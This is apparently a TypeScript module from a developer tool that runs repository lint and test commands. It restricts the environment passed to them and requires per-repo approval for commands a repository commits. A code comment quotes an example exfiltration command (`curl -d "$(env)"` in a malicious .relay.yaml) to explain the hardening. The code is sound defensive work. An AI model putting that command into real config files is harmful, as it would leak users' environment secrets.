import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import type { Directive } from "./directive.ts";
import { directiveIsRepoLocal } from "./paths.ts";
import { isVerifyCommandTrusted } from "./settings.ts";

export type VerifyResult = {
  ok: boolean;
  results: { name: string; command: string; exitCode: number; output: string }[];
};

const VERIFY_TIMEOUT_MS = 10 * 60 * 1000;

/**
 * Verify commands run through `bash -lc` — with the caller's full
 * environment they were a one-line exfiltration primitive for any repo
 * that commits a malicious `.relay.yaml` (`lint: curl -d "$(env)" …`).
 * Only what a lint/test toolchain actually needs passes through; repos
 * whose tests genuinely need more belong in the user-level directive.
 */
const VERIFY_ENV_ALLOWLIST = [
  "PATH",
  "HOME",
  "TMPDIR",
  "USER",
  "LOGNAME",
  "SHELL",
  "LANG",
  "LC_ALL",
  "TERM",
];

function verifyEnv(): Record<string, string> {
  const env: Record<string, string> = {};
  for (const key of VERIFY_ENV_ALLOWLIST) {
    const v = process.env[key];
    if (v !== undefined) env[key] = v;
  }
  // CI=1 flips vitest/jest/react-scripts out of watch mode — without it a
  // repo whose `test` script watches would hang the run forever
  env.CI = "1";
  env.FORCE_COLOR = "0";
  return env;
}

export type VerifyCommand = {
  name: string;
  command: string | null;
  /**
   * true when the raw shell string came from a file the REPO controls
   * (.relay.yaml, or a repo-local router.yaml) rather than from the user's
   * own config or conventional toolchain detection. Repo-sourced strings
   * are arbitrary code chosen by whoever committed them, so they need a
   * one-time per-repo approval (`relay trust`) before relay will run them.
   */
  repoSourced: boolean;
};

/** Resolve what would run for each verify name, and who chose the string. */
export function resolveVerifyCommands(
  cwd: string,
  directive: Directive,
  names: string[] | undefined,
): VerifyCommand[] {
  if (!names || names.length === 0) return [];
  const repoLocal = directiveIsRepoLocal(cwd);
  return names.map((name) => {
    const configured = directive.verify_commands[name];
    if (configured && configured !== "auto") {
      return { name, command: configured, repoSourced: repoLocal };
    }
    const fromRelayYaml = relayYamlCommand(cwd, name);
    if (fromRelayYaml) return { name, command: fromRelayYaml, repoSourced: true };
    if (name === "lint") return { name, command: detectLint(cwd), repoSourced: false };
    if (name === "test") return { name, command: detectTest(cwd), repoSourced: false };
    return { name, command: null, repoSourced: false };
  });
}

/**
 * Fail-fast guard, called BEFORE any tokens are spent: repo-sourced verify
 * commands that this machine hasn't approved abort the run with the exact
 * command shown, instead of silently executing it (or burning an
 * escalation ladder on a verify that would be refused anyway).
 */
export function assertVerifyTrusted(
  cwd: string,
  repoKey: string,
  directive: Directive,
  names: string[] | undefined,
): void {
  const untrusted = resolveVerifyCommands(cwd, directive, names).filter(
    (c) => c.command && c.repoSourced && !isVerifyCommandTrusted(repoKey, c.command),
  );
  if (untrusted.length === 0) return;
  const list = untrusted.map((c) => `  ${c.name}: ${c.command}`).join("\n");
  throw new Error(
    `this repo supplies its own verify command(s) that aren't trusted on this machine yet:\n${list}\n` +
      `relay runs verify commands as you, so a repo-committed command is arbitrary code. ` +
      `Review the command(s) above, then approve them with \`relay trust --yes\` in this repo (once per repo, re-required if they change).`,
  );
}

export async function runVerify(
  cwd: string,
  directive: Directive,
  verifyNames: string[] | undefined,
  opts: { timeoutMs?: number } = {},
): Promise<VerifyResult> {
  if (!verifyNames || verifyNames.length === 0) {
    return { ok: true, results: [] };
  }
  const timeoutMs = opts.timeoutMs ?? VERIFY_TIMEOUT_MS;

  const results: VerifyResult["results"] = [];
  for (const { name, command } of resolveVerifyCommands(cwd, directive, verifyNames)) {
    if (!command) {
      results.push({
        name,
        command: "(skipped — not detected)",
        exitCode: 0,
        output: "",
      });
      continue;
    }
    const proc = Bun.spawn(["bash", "-lc", command], {
      cwd,
      stdout: "pipe",
      stderr: "pipe",
      env: verifyEnv(),
    });
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      proc.kill();
    }, timeoutMs);
    const [stdout, stderr, exitCode] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
      proc.exited,
    ]);
    clearTimeout(timer);
    results.push({
      name,
      command,
      exitCode: timedOut ? 124 : exitCode,
      output:
        (timedOut ? `[relay] verify "${name}" timed out after ${Math.round(timeoutMs / 1000)}s and was killed\n` : "") +
        (stdout + stderr).slice(0, 4_000),
    });
  }

  return {
    ok: results.every((r) => r.exitCode === 0),
    results,
  };
}

/** Raw shell string from the repo-committed `.relay.yaml`, if present. */
function relayYamlCommand(cwd: string, name: string): string | null {
  const relayYaml = join(cwd, ".relay.yaml");
  if (!existsSync(relayYaml)) return null;
  try {
    const text = readFileSync(relayYaml, "utf8");
    const match = text.match(new RegExp(`^${name}:\\s*(.+)$`, "m"));
    if (match?.[1]) return match[1].trim();
  } catch {
    // ignore
  }
  return null;
}

function detectLint(cwd: string): string | null {
  if (existsSync(join(cwd, "package.json"))) {
    try {
      const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8"));
      if (pkg.scripts?.lint) return "npm run lint --if-present";
      if (pkg.scripts?.["lint:check"]) return "npm run lint:check --if-present";
    } catch {
      // ignore
    }
    if (existsSync(join(cwd, "turbo.json"))) return "npx turbo lint";
  }
  if (existsSync(join(cwd, "ruff.toml")) || existsSync(join(cwd, "pyproject.toml"))) {
    return "ruff check .";
  }
  if (existsSync(join(cwd, "Cargo.toml"))) return "cargo fmt --check && cargo clippy -- -D warnings";
  if (existsSync(join(cwd, "Makefile"))) {
    const mk = readFileSync(join(cwd, "Makefile"), "utf8");
    if (/^lint:/m.test(mk)) return "make lint";
  }
  return null;
}

function detectTest(cwd: string): string | null {
  if (existsSync(join(cwd, "package.json"))) {
    try {
      const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8"));
      if (pkg.scripts?.test) {
        // prefer bun test when bun.lock present
        if (existsSync(join(cwd, "bun.lock")) || existsSync(join(cwd, "bun.lockb"))) {
          return "bun test";
        }
        return "npm test --if-present";
      }
    } catch {
      // ignore
    }
  }
  if (existsSync(join(cwd, "Cargo.toml"))) return "cargo test";
  if (existsSync(join(cwd, "pyproject.toml")) || existsSync(join(cwd, "pytest.ini"))) {
    return "pytest -q";
  }
  if (existsSync(join(cwd, "Makefile"))) {
    const mk = readFileSync(join(cwd, "Makefile"), "utf8");
    if (/^test:/m.test(mk)) return "make test";
  }
  return null;
}
